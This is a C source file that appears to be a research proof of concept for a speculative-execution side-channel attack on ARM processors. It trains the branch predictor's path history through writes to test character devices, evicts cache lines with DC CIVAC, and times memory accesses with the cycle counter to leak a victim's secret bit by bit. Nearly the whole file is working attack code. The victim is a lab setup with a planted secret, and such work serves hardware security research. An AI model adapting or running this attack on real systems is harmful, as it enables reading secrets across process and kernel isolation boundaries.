#include "Attacker_rsa.h"
#include "Victim.h"
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include "evict_set.h"

unsigned char attacker_array[BYTE_MAX*Cache_Line];
int randa[BYTE_MAX];
unsigned long long difference[BYTE_MAX];
int len_array[BYTE_MAX*Cache_Line];
int times[BYTE_MAX];
char mark[BYTE_MAX];

#define min(x, y) (x) < (y) ? (x) : (y)

cache_ctx_t evict_set_for_attacker_array = NULL;
cache_ctx_t evict_set_for_len_array = NULL;
extern Elem** evsets;

int PHR_Flush(int fd, int shift) {
    int i=0;
    volatile int temp = 3;
    
    temp+=read(fd, "not affect res", 15);
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
			asm volatile("isb\n");
			asm volatile("dsb sy\n");

    // for(i = 0; i < shift; i++) i += (i+1)/(i+1)-1;
    i = -1;
    do {
        i += (i+1)/(i+1);
    } while(i < shift);
			asm volatile("isb\n");
			asm volatile("dsb sy\n");
    if (i < len_array[i*Cache_Line])
        temp += attacker_array[i * Cache_Line];

    return temp;
}

int main(int argc, char* argv[]) {
    unsigned long long start, end;
    unsigned char temp;
    char buf[30];
    int gened[BYTE_MAX];
    unsigned long long secret;
    volatile int tmp = 0;
    for (int i = 0; i < BYTE_MAX; i++) gened[i] = 0;
    int fd0 = open("/dev/mychardev-0", O_RDWR), fd1 = open("/dev/mychardev-1", O_RDWR);
    int reverse, offset;
    if (argc >= 2)
        secret = atoi(argv[1]);
    else secret = 23193659;
    if (argc >= 3)
        offset = atoi(argv[2]);
    else offset = 0;
    srand(time(NULL));
    if (secret == 0) { // randomly generate secret and set
        int idx=0;
        secret = (1ULL * (rand() & 1) << 63) | (1ULL * rand() << 32) | (1ULL * (rand() & 1) << 31) | (1ULL * rand());
        printf("%llx\n", secret);
        while (secret > 0) {
            buf[idx++] = secret & 0xff;
            // printf("%d ", buf[idx-1]);
            secret >>= 8;
        }
        write(fd1, buf, idx);
    }
    // return 0;
    // puts("-----------------split line-----------------");
    for(int i = 0; i < BYTE_MAX; i++) {
        int r = rand() % BYTE_MAX;
        while(gened[r])
            r = rand() % BYTE_MAX;
        gened[r] = 1;
        randa[i] = r;
    }


    for(int i = 0; i < BYTE_MAX; i++) {
        attacker_array[i*Cache_Line] = randa[i];
        difference[i] = 99999;
        len_array[i*Cache_Line] = PHR_LEN+10;
    }
    int first = 0; // fisrt round get secret == 1 or == 0
for(int atk = 0; atk < 2; atk++) {
    int shift = PHR_LEN-1-offset;
    shift -= (atk+1)*5;
    // prepare evict set
    evict_set_for_attacker_array = evsets_prepare((char*)(attacker_array + shift * Cache_Line));
    evict_set_for_len_array = evsets_prepare((char*)(len_array + shift * Cache_Line));
    for (int k = 0; k < ATK_ROUNDS; k++) {
        char train_buf[30];
        // len_array[shift*Cache_Line] = shift;
        len_array[shift*Cache_Line] = PHR_LEN+10;
        // train 1
        train_buf[7] = 0x80;
        if (atk == 1 && first == 1) train_buf[7] = 0xc0;
        else if (atk == 1 && first == 0) train_buf[7] = 0x40;
        train_buf[6] = 0x00;
        train_buf[5] = 0x00;
        train_buf[4] = 0x80;
        train_buf[3] = 0x00;
        train_buf[2] = 0x00;
        train_buf[1] = 0x00;
        train_buf[0] = 0x00;
        write(fd0, train_buf, 8);
        for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
            // printf("1\n");
            tmp+=PHR_Flush(fd0, shift);
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
			asm volatile("dsb sy\n");
			asm volatile("isb\n");
        }
        // train 0
        len_array[shift*Cache_Line] = shift;
        // len_array[shift*Cache_Line] = PHR_LEN+10;
        // train_buf[2] = 0b10110000;
        train_buf[7] = 0x00;
        if (atk == 1 && first == 1) train_buf[7] = 0x40;
        else if (atk == 1 && first == 0) train_buf[7] = 0x00;
        train_buf[6] = 0x00;
        train_buf[5] = 0x00;
        train_buf[4] = 0x80;
        train_buf[3] = 0x00;
        train_buf[2] = 0x00;
        train_buf[1] = 0x00;
        train_buf[0] = 0x00;
        write(fd0, train_buf, 8);
        for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
            // printf("1\n");

            tmp+=PHR_Flush(fd0, shift);
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
			asm volatile("dsb sy\n");
			asm volatile("isb\n");
        }

        len_array[shift*Cache_Line] = shift;
        len_array[shift*Cache_Line] = PHR_LEN+10;
        // attacker retrieve
	 	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (attacker_array+shift*Cache_Line));
	 	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (attacker_array+shift*Cache_Line));
	 	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (attacker_array+shift*Cache_Line));
		asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (len_array+shift*Cache_Line));
		asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (len_array+shift*Cache_Line));
		asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (len_array+shift*Cache_Line));
        
        // #include "unroll_code_ecdsa.c" // use eviction to flush cache do not use DC CIVAC

        tmp+=PHR_Flush(fd1, shift);
        // tmp+=attacker_array[255*Cache_Line];
        unsigned int tsc_aux;

			
			asm volatile(
				"isb\n"
				"dsb sy\n"
				"mrs %[times], PMCCNTR_EL0\n"
				:[times]"=&r"(start)
				::);
            temp = *(unsigned char*)(attacker_array+shift*Cache_Line);

			asm volatile(
				"isb\n"
				"dsb sy\n"
				"mrs %[times], PMCCNTR_EL0\n"
				:[times]"=&r"(end)
				::);

            times[shift] += (end-start) <= HIT_THRESHOLD;
            
    }
 
    unsigned int tsc_aux;


        mark[shift] = times[shift] >= TIMES_THRESHOLD;

    int s = 0, e = PHR_LEN;
    int MAX_OUTPUT_LINES=6;
    int out_times = 0;

        if(mark[shift]) {
            printf("confidence [%d] hit at: %d, means secret equals 1\n", times[shift], shift);
            first = 1;
        } else {
            puts("means secret equals 0");
            first = 0;
        }
}
    close(fd0);
    close(fd1);
 

}
